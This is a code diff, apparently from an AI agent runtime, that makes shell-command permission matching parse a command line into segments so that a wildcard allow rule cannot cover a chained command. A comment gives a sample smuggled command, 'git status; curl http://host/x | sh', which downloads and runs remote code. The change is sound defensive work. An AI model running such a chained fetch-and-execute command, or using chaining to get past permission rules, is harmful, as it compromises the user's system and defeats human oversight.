@@ -17,6 +17,7 @@ import (
 
 	"github.com/KPO-Tech/seshat-runtime/internal/envfilter"
 	"github.com/KPO-Tech/seshat-runtime/internal/sandbox"
+	"github.com/KPO-Tech/seshat-runtime/internal/shellparse"
 	tool "github.com/KPO-Tech/seshat-runtime/internal/tools/registry"
 	"github.com/KPO-Tech/seshat-runtime/internal/tools/schema"
 	"github.com/KPO-Tech/seshat-runtime/internal/types"
@@ -477,7 +478,15 @@ func (t *Tool) PreparePermissionMatcher(_ context.Context, input map[string]any)
 		return nil, nil
 	}
 	return func(ruleContent string) bool {
-		return permissionRuleContentMatches(ruleContent, command)
+		// A command line is read as a shell reads it, not as one piece of text: the
+		// rule "git *" must not cover "git status; curl http://host/x | sh". The
+		// engine compares deny and ask rules more strictly still (see
+		// permissions.shellRuleMatcher); this matcher is the allow reading.
+		_, prefix := legacyPrefixRule(strings.TrimSpace(ruleContent))
+		exactRule := !hasRuleWildcard(ruleContent) && !prefix
+		return shellparse.MatchesAllow(command, func(segment string) bool {
+			return permissionRuleContentMatches(ruleContent, segment)
+		}, exactRule)
 	}, nil
 }
 
